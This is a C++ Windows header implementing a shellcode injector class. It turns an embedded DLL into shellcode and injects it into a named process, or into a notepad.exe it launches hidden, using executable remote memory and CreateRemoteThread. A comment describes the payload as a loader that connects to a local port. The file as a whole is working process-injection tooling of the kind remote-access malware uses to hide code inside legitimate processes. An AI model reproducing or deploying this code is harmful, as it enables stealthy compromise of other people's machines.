#pragma once

#include "StdAfx.h"
#include <string>
#include <iostream>
#include <tlhelp32.h>
// A shell code loader connect to 127.0.0.1:6543.
// Build: xxd -i TinyRun.dll > SCLoader.cpp
#include "SCLoader.cpp"

BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength,
	DWORD flags, LPSTR& outBytes, DWORD& outLength);

// A shell code injector.
class ShellcodeInj
{
public:
	// Return the process id if inject succeed.
	int InjectProcess(const char* processName = nullptr) {
		if (processName) {
			auto pid = GetProcessIdByName(processName);
			if (pid ? InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) : false)
				return pid;
		}
		PROCESS_INFORMATION pi = {};
		STARTUPINFO si = { sizeof(STARTUPINFO) };
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;  // hide the window
		if (CreateProcess(NULL, "\"notepad.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return InjectShellcode(pi.dwProcessId, (BYTE*)TinyRun_dll, TinyRun_dll_len) ? pi.dwProcessId : 0;
		}
		return 0;
	}
private:
	// Find process id by name.
	DWORD GetProcessIdByName(const std::string& procName) {
		DWORD pid = 0;
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32 pe32 = { sizeof(pe32) };
			if (Process32First(hSnap, &pe32)) {
				do {
					if (_stricmp(pe32.szExeFile, procName.c_str()) == 0) {
						pid = pe32.th32ProcessID;
						break;
					}
				} while (Process32Next(hSnap, &pe32));
			}
			CloseHandle(hSnap);
		}
		return pid;
	}

	// Check if the process is 64bit.
	bool IsProcess64Bit(HANDLE hProcess, BOOL& is64Bit)
	{
		BOOL bWow64 = FALSE;
		typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS2)(HANDLE, USHORT*, USHORT*);
		HMODULE hKernel = GetModuleHandleA("kernel32.dll");

		LPFN_ISWOW64PROCESS2 fnIsWow64Process2 = hKernel ?
			(LPFN_ISWOW64PROCESS2)::GetProcAddress(hKernel, "IsWow64Process2") : nullptr;

		if (fnIsWow64Process2)
		{
			USHORT processMachine = 0, nativeMachine = 0;
			if (fnIsWow64Process2(hProcess, &processMachine, &nativeMachine))
			{
				is64Bit = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) && (nativeMachine == IMAGE_FILE_MACHINE_AMD64);
				return true;
			}
		}
		else
		{
			// Old system use IsWow64Process
			if (IsWow64Process(hProcess, &bWow64))
			{
				is64Bit = sizeof(void*) == 8 ? TRUE : !bWow64;
				return true;
			}
		}
		return false;
	}

	// Check if it's able to inject.
	HANDLE CheckProcess(DWORD pid) {
		HANDLE hProcess = OpenProcess(
			PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
			FALSE, pid);
		if (!hProcess) {
			Mprintf("OpenProcess failed. PID: %d\n", pid);
			return nullptr;
		}

		// Check process and system architecture.
		BOOL targetIs64Bit = FALSE;
		BOOL success = IsProcess64Bit(hProcess, targetIs64Bit);
		if (!success) {
			Mprintf("Get architecture failed \n");
			CloseHandle(hProcess);
			return nullptr;
		}
		const BOOL selfIs64Bit = sizeof(void*) == 8;
		if (selfIs64Bit != targetIs64Bit) {
			Mprintf("[Unable inject] Injector is %s, Target process is %s\n",
				(selfIs64Bit ? "64bit" : "32bit"), (targetIs64Bit ? "64bit" : "32bit"));
			CloseHandle(hProcess);
			return nullptr;
		}
		return hProcess;
	}

	bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength) {
		if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
			LPSTR finalShellcode = NULL;
			DWORD finalSize;
			if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, finalShellcode, finalSize)) {
				return false;
			}
			compressedBuffer = new BYTE[finalSize];
			ulTotalSize = finalSize;

			memcpy(compressedBuffer, finalShellcode, finalSize);
			free(finalShellcode);

			return true;
		}
		return false;
	}

	// Inject shell code to target process.
	bool InjectShellcode(DWORD pid, const BYTE* pDllBuffer, int dllSize) {
		HANDLE hProcess = CheckProcess(pid);
		if (!hProcess)
			return false;

		// Convert DLL -> Shell code.
		LPBYTE shellcode = NULL;
		int len = 0;
		if (!MakeShellcode(shellcode, len, (LPBYTE)pDllBuffer, dllSize)) {
			Mprintf("MakeShellcode failed \n");
			CloseHandle(hProcess);
			return false;
		}

		LPVOID remoteBuffer = VirtualAllocEx(hProcess, nullptr, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!remoteBuffer) {
			Mprintf("VirtualAllocEx failed \n");
			CloseHandle(hProcess);
			return false;
		}

		if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, len, nullptr)) {
			Mprintf("WriteProcessMemory failed \n");
			VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			delete[] shellcode;
			return false;
		}
		delete[] shellcode;

		// Shell code entry.
		LPTHREAD_START_ROUTINE entry = reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<ULONG_PTR>(remoteBuffer));

		HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, entry, remoteBuffer, 0, nullptr);
		if (!hThread) {
			Mprintf("CreateRemoteThread failed \n");
			VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			return false;
		}

		WaitForSingleObject(hThread, INFINITE);

		Mprintf("Finish injecting to PID: %d\n", pid);

		VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);

		return true;
	}
};
